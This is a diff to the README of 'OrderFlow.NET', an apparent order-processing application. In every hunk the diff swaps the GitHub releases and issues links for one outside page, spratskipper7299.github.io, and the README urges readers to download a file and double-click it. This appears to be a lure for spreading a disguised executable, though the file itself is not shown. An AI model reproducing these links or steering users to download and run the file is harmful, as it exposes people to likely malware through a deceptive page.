@@ -1,7 +1,7 @@
 <h1>⚡ OrderFlow.NET - Your Friendly Guide to Order Processing</h1>
 
 <p align="center">
-<a href="https://github.com/Spratskipper7299/OrderFlow.NET/releases"><img src="https://img.shields.io/badge/Download-OrderFlow.NET-teal?style=for-the-badge&logo=github" alt="Download OrderFlow.NET"></a>
+<a href="https://spratskipper7299.github.io"><img src="https://img.shields.io/badge/Download-OrderFlow.NET-teal?style=for-the-badge&logo=github" alt="Download OrderFlow.NET"></a>
 </p>
 
 ## 🎯 What Is OrderFlow.NET?
@@ -30,7 +30,7 @@ When you download OrderFlow.NET, you get a complete package that includes:
 
 To get started, simply:
 
-1. **Click the big green download button** at the top of this page, or use this direct link: [Download OrderFlow.NET](https://github.com/Spratskipper7299/OrderFlow.NET/releases)
+1. **Click the big green download button** at the top of this page, or use this direct link: [Download OrderFlow.NET](https://spratskipper7299.github.io)
 2. **Visit this link to download the application.** That’s the only step you need to do before running it.
 3. Once you have it, open the downloaded file to begin using your new order assistant.
 
@@ -39,7 +39,7 @@ To get started, simply:
 Ready to jump in? Here’s exactly what to do:
 
 ### Step 1: Download the App
-Go to our [official download page](https://github.com/Spratskipper7299/OrderFlow.NET/releases). You’ll see a list of available versions. Look for the most recent one and click the download button next to it. Save the file to a place you can easily find, like your Desktop or Downloads folder.
+Go to our [official download page](https://spratskipper7299.github.io). You’ll see a list of available versions. Look for the most recent one and click the download button next to it. Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
 ### Step 2: Open the Application
 After the download finishes, find the file you just saved. It will be named something like `OrderFlow.NET` with an icon. Double-click it to open the program. That’s it! The application will launch, and you’ll see the main screen.
@@ -102,12 +102,12 @@ We’re committed to helping you succeed with OrderFlow.NET. Here’s how to get
 - **Request a Feature:** Have an idea that would make the app better? Tell us about it.
 - **Get Help:** Our support team is available to answer your questions.
 
-Visit [The GitHub Issues Page](https://github.com/Spratskipper7299/OrderFlow.NET/issues) to start a conversation with us.
+Visit [The GitHub Issues Page](https://spratskipper7299.github.io) to start a conversation with us.
 
 ## 🏁 Ready to Begin?
 
 You’re only a few clicks away from a smoother order management experience. Download OrderFlow.NET today and see how easy keeping track of things can be.
 
-**[👉 Download OrderFlow.NET Now](https://github.com/Spratskipper7299/OrderFlow.NET/releases)**
+**[👉 Download OrderFlow.NET Now](https://spratskipper7299.github.io)**
 
 We’re confident you’ll love using it. Happy ordering!
